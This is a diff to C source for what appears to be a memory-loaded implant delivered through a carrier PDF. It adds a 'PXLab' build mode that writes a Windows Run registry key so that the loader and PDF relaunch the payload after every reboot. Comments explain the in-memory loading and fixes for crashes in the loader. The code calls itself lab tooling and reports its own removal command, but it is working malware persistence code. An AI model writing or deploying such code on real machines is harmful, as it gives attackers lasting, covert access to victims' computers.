@@ -2116,6 +2116,109 @@ static int px_cap_browser(char *args, char *report, unsigned int cap)
 }
 
 /* ================================================================== */
+/* Persistence that stays                                               */
+/* ================================================================== */
+/*                                                                   */
+/* The capability library's `persist` writes a Run key and then      */
+/* REMOVES it, because a lab technique that leaves litter is not a    */
+/* lab technique. That is right for a measurement and wrong for an   */
+/* instrument that is meant to survive a reboot.                     */
+/*                                                                   */
+/* So there is a separate build flag for it: PX_PERSISTENT. With it   */
+/* on, the payload installs the key on its first connection and      */
+/* LEAVES it, and reports the command that removes it.               */
+/*                                                                   */
+/* WHAT THE COMMAND IS                                                 */
+/*   The payload's image path is not always its own. When the        */
+/*   payload is mapped in memory by the loader, GetModuleFileName   */
+/*   returns the LOADER's path -- the payload has no image of its    */
+/*   own. So the Run key points at the loader with the carrier PDF  */
+/*   as its argument, which is exactly the command that reproduces   */
+/*   the session.                                                    */
+/*                                                                   */
+/*   The loader tells the payload where the PDF is, through an       */
+/*   environment variable, because the payload has no other way to  */
+/*   know.                                                            */
+/* ================================================================== */
+
+/* Install the Run key and leave it.
+ *
+ * Returns 0 on success. The report says what was written and how to
+ * take it away again. */
+int px_install_persistence(char *report, unsigned int cap)
+{
+    /* A LOCAL pointer, not a file-scope static.
+     *
+     * A file-scope static with an initialiser lives in the section's
+     * INITIALISED data -- and the payload's .data section has only 512
+     * bytes of that, with the rest as BSS. The loader copies the
+     * initialised bytes and zeroes the BSS, so a static whose slot fell
+     * past the initialised region came back as a NULL pointer, and
+     * RegCreateKeyExA with a NULL key path dies with an access
+     * violation.
+     *
+     * A local pointer puts the LITERAL in .rdata, where it belongs, and
+     * the pointer itself on the stack, where there is room for it. */
+    const char *runkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    /* Static, not on the stack.
+     *
+     * Three 260-byte buffers on the stack would put this function's
+     * frame close to a page, and the payload's own entry frame is on top
+     * of it. The stack grows one page per fault, so a chain of frames
+     * that together cross a page boundary cannot grow the stack at all
+     * -- the first call inside it dies with an access violation.
+     *
+     * That is the same rule the rest of the payload follows, and the
+     * same bug the 64KB chunk buffer used to cause. */
+    static char image[MAX_PATH];
+    static char command[MAX_PATH + 32];
+    static char pdf[MAX_PATH];
+    DWORD n;
+    HKEY k;
+    LONG rc;
+
+    if (!GetModuleFileNameA(NULL, image, MAX_PATH)) {
+        px_snprintf(report, cap, "could not find the image path");
+        return -1;
+    }
+
+    /* Is this the in-memory carrier? Then the command has to name the
+     * document as well, or the loader would have nothing to open. */
+    n = GetEnvironmentVariableA("PX_CARRIER_PDF", pdf, MAX_PATH);
+    if (n > 0 && n < MAX_PATH) {
+        px_snprintf(command, sizeof(command), "\"%s\" \"%s\"", image, pdf);
+    } else {
+        px_strcpy(command, image, sizeof(command));
+    }
+    px_logf("[px] persist: command=%s\n", command);
+
+    rc = RegCreateKeyExA(HKEY_CURRENT_USER, runkey, 0, NULL, 0,
+                         KEY_SET_VALUE, NULL, &k, NULL);
+    if (rc != ERROR_SUCCESS) {
+        px_snprintf(report, cap, "could not open %s, error %ld",
+                    runkey, (long)rc);
+        return -1;
+    }
+    rc = RegSetValueExA(k, "PXLab", 0, REG_SZ,
+                        (const BYTE *)command,
+                        (DWORD)(px_strlen(command) + 1));
+    RegCloseKey(k);
+
+    if (rc != ERROR_SUCCESS) {
+        px_snprintf(report, cap, "could not write the Run key, error %ld",
+                    (long)rc);
+        return -1;
+    }
+
+    px_snprintf(report, cap,
+                "Run key 'PXLab' written with value \"%s\", and LEFT IN "
+                "PLACE. It survives a reboot. Remove it with: "
+                "reg delete \"HKCU\\%s\" /v PXLab /f",
+                command, runkey);
+    return 0;
+}
+
+/* ================================================================== */
 /* The table                                                          */
 /* ================================================================== */
 
